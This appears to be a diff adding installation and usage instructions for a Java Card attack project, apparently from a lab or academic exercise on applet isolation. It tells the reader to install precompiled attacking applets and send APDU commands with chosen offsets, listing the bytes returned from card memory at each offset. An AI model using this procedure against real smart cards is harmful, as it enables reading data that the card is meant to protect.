@@ -1,0 +1,49 @@
+=============================================================================================================================================
+
+INSTRUCTIONS FOR INSTALLATION AND EXECUTION
+
+==========================================================================
+
+Step 1:  Install server.cap and client.cap given in CAP_File folder. Both the files are already compiled to carry out attack
+
+==========================================================================
+
+Step 2:  Communicate with ClientApplet using ComnCard class and execute the attack. ComnCard class is located in Project/Shareable/src/ComnCard/ folder. Some cases are explained with examples as given below:
+
+	    /**
+             * Following example based on Javacos A40 Java Card
+             * 
+             * All communications are with ClientApplet with 
+             * 
+             * SELECT_SIMPLEAPPLET[] = {(byte) 0x00, (byte) 0xa4, (byte) 0x04, (byte) 0x00, (byte) 0x06,
+                                                       (byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x02, (byte)0x01};
+             * 
+             * CASE-1: Offset set as 00 00
+             * 
+             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
+             * apdu[CardMngr.OFFSET_INS] = (byte) 0x71; 
+             * apdu[CardMngr.OFFSET_P1]  = (byte) 0x00;
+             * apdu[CardMngr.OFFSET_P2]  = (byte) 0x00;
+             * 
+             * Returns b0 71 90 00. Here b0 71 are the first two bytes sent through APDU
+             * 
+             * CASE-2: Offset set as 00 ae
+             * 
+             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
+             * apdu[CardMngr.OFFSET_INS] = (byte) 0x71; 
+             * apdu[CardMngr.OFFSET_P1]  = (byte) 0x00;
+             * apdu[CardMngr.OFFSET_P2]  = (byte) 0xae;
+             * 
+             * Returns ca 75 90 00 
+             * 
+             * CASE-3: Offset set as 01 04
+             * 
+             * apdu[CardMngr.OFFSET_CLA] = (byte) 0xB0;
+             * apdu[CardMngr.OFFSET_INS] = (byte) 0x71; 
+             * apdu[CardMngr.OFFSET_P1]  = (byte) 0x01;
+             * apdu[CardMngr.OFFSET_P2]  = (byte) 0x04;
+             * 
+             * Returns 59 f9 90 00 
+             * 
+             */
+
